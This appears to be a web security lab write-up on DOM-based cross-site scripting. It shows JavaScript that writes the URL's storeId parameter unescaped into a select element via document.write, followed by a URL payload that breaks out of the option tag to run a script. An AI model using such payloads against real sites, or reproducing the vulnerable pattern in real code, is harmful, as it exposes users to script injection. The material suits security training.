# Lab: DOM XSS in document.write sink using source location.search inside a select element
## Description

The vulnerable JS code:
```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
	document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
	if(stores[i] === store) {
		continue;
	}
	document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

## Solution

`/product?productId=2&storeId=lort</option><script>alert(1)</script><option>`

